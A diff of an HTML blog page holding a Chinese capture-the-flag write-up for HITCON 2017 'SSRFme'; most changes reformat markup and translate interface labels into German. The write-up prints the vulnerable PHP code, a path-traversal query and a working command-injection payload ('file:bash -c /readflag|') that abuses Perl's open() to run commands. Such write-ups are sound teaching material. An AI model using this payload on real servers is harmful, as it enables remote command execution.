@@ -10,12 +10,12 @@
 <title>2.7 [HITCON 2017]SSRFme - Da4er&#39;s Blogs</title>
 
 
-    <meta name="description" content="首先拿到源码：12345678910111213141516&lt;?php    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &amp;#123;        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);">
+    <meta name="description" content="首先拿到源码： 12345678910111213141516&lt;?php    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &amp;#123;        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2.7 [HITCON 2017]SSRFme">
 <meta property="og:url" content="https://da4er.top/2-7-HITCON-2017-SSRFme.html">
 <meta property="og:site_name" content="Da4er&#39;s Blogs">
-<meta property="og:description" content="首先拿到源码：12345678910111213141516&lt;?php    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &amp;#123;        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);">
+<meta property="og:description" content="首先拿到源码： 12345678910111213141516&lt;?php    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &amp;#123;        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);">
 <meta property="og:image" content="https://da4er.top/images/og_image.png">
 <meta property="article:published_time" content="2020-02-07T14:58:11.000Z">
 <meta property="article:modified_time" content="2020-02-07T14:59:08.064Z">
@@ -120,7 +120,7 @@
                 
                 
                 
-                <a class="navbar-item search" title="Search" href="javascript:;">
+                <a class="navbar-item search" title="Suche" href="javascript:;">
                     <i class="fas fa-search"></i>
                 </a>
                 
@@ -149,7 +149,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    4 minutes read (About 539 words)
+                    4 minutes lesen (Über 539 Worte)
                 </span>
                 
                 
@@ -162,9 +162,24 @@
             
         </h1>
         <div class="content">
-            <p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>首先拿到源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;</span><br><span class="line">        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);</span><br><span class="line">        $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">    $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><br>主要代码是这个部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br></pre></td></tr></table></figure><br><strong>代码逻辑为：1.创建一个’orange/客户端ip哈希值’的目录；2.将传入的URL带入命令GET执行 — GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求；3.解析filename参数，传入filename的最后一级文件夹（获取不为空）并创建。</strong><br><img src="/2-7-HITCON-2017-SSRFme/1.png" class title="This is an test image"></p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<p><strong>首先拿到源码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;</span><br><span class="line">        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);</span><br><span class="line">        $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">    $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+<p>主要代码是这个部分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br></pre></td></tr></table></figure>
+<p><strong>代码逻辑为：1.创建一个’orange/客户端ip哈希值’的目录；2.将传入的URL带入命令GET执行 — GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求；3.解析filename参数，传入filename的最后一级文件夹（获取不为空）并创建。</strong></p>
+<img src="/2-7-HITCON-2017-SSRFme/1.png" class title="This is an test image">
+
 <hr>
-<p><strong>解法有很多，但是我在做的时候主要用的open()函数绕过检测机制的方法。</strong><br><strong>首先通过上面代码的逻辑访问网站根目录：<br>创建一个名为a的文件，通过url参数访问根目录，那么访问的信息就会存储在a文件下。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&amp;filename&#x3D;a</span><br><span class="line">sandbox&#x2F;0a3519231615f5dcb5681b439c71d89c&#x2F;a</span><br></pre></td></tr></table></figure><br><img src="/2-7-HITCON-2017-SSRFme/2.png" class title="This is an test image"><br>看到有个readflag。<br>其次用到了perl语言的open函数参数是可控的，可以执行任意命令。<br><strong>这里要明确一点perl的GET命令是调用open函数来实现执行命令的。</strong><br>下面是截取别的大佬博客wp中的一段：<br><img src="/2-7-HITCON-2017-SSRFme/3.png" class title="This is an test image"><br><strong>这个意思有两点：1.在file.pm中open函数参数可控；2.file.pm先判断(file:文件名)中的文件是否存在，才能执行文件名对应的命令。</strong><br>所以最终的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;bash -c &#x2F;readflag|  创建相应的同名文件。</span><br><span class="line">url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;da4er   利用open执行代码。</span><br><span class="line">最后直接访问&#x2F; sandbox &#x2F;哈希值&#x2F; 123就能得到flag。</span><br></pre></td></tr></table></figure><br><img src="/2-7-HITCON-2017-SSRFme/4.png" class title="This is an test image">)</p>
+<p><strong>解法有很多，但是我在做的时候主要用的open()函数绕过检测机制的方法。</strong><br><strong>首先通过上面代码的逻辑访问网站根目录：<br>创建一个名为a的文件，通过url参数访问根目录，那么访问的信息就会存储在a文件下。</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&amp;filename&#x3D;a</span><br><span class="line">sandbox&#x2F;0a3519231615f5dcb5681b439c71d89c&#x2F;a</span><br></pre></td></tr></table></figure>
+<img src="/2-7-HITCON-2017-SSRFme/2.png" class title="This is an test image">
+<p>看到有个readflag。<br>其次用到了perl语言的open函数参数是可控的，可以执行任意命令。<br><strong>这里要明确一点perl的GET命令是调用open函数来实现执行命令的。</strong><br>下面是截取别的大佬博客wp中的一段：</p>
+<img src="/2-7-HITCON-2017-SSRFme/3.png" class title="This is an test image">
+<p><strong>这个意思有两点：1.在file.pm中open函数参数可控；2.file.pm先判断(file:文件名)中的文件是否存在，才能执行文件名对应的命令。</strong><br>所以最终的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;bash -c &#x2F;readflag|  创建相应的同名文件。</span><br><span class="line">url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;da4er   利用open执行代码。</span><br><span class="line">最后直接访问&#x2F; sandbox &#x2F;哈希值&#x2F; 123就能得到flag。</span><br></pre></td></tr></table></figure>
+<img src="/2-7-HITCON-2017-SSRFme/4.png" class title="This is an test image">)
+
 <hr>
 <p>参考博客：<br><a href="https://www.jianshu.com/p/3f82685f56a8">1</a><br><a href="http://momomoxiaoxi.com/2017/11/08/HITCON/">2</a></p>
 
@@ -188,7 +203,7 @@
 
 <div class="card">
     <div class="card-content">
-        <h3 class="menu-label has-text-centered">Like this article? Support the author with</h3>
+        <h3 class="menu-label has-text-centered">Gefällt Ihnen der Artikel? Unterstützen Sie den Autor mit</h3>
         <div class="buttons is-centered">
             
                 
@@ -293,7 +308,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Categories
+                Kategorien
             </h3>
             <ul class="menu-list">
             <li>
@@ -423,7 +438,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Kategorien
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -448,7 +463,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                Folgen</a>
         </div>
         
         
@@ -477,7 +492,7 @@
             <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Letzte Einträge
         </h3>
         
         <article class="media">
@@ -582,7 +597,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archive
         </h3>
         <ul class="menu-list">
         
@@ -750,7 +765,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Kategorien
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -775,7 +790,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                Folgen</a>
         </div>
         
         
@@ -804,7 +819,7 @@
         <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Letzte Einträge
         </h3>
         
         <article class="media">
@@ -909,7 +924,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archive
         </h3>
         <ul class="menu-list">
         
@@ -1158,7 +1173,7 @@ document.addEventListener('DOMContentLoaded', function () {
 </script>
 
 
-<a id="back-to-top" title="Back to Top" href="javascript:;">
+<a id="back-to-top" title="Zurück nach oben" href="javascript:;">
     <i class="fas fa-chevron-up"></i>
 </a>
 <script src="/js/back-to-top.js" defer></script>
@@ -1182,7 +1197,7 @@ document.addEventListener('DOMContentLoaded', function () {
     <div class="searchbox ins-search">
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Tippen Sie etwas..." />
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -1195,10 +1210,10 @@ document.addEventListener('DOMContentLoaded', function () {
         var INSIGHT_CONFIG = {
             TRANSLATION: {
                 POSTS: 'Posts',
-                PAGES: 'Pages',
-                CATEGORIES: 'Categories',
+                PAGES: 'Seiten',
+                CATEGORIES: 'Kategorien',
                 TAGS: 'Tags',
-                UNTITLED: '(Untitled)',
+                UNTITLED: '(Unbenannt)',
             },
             CONTENT_URL: '/content.json',
         };
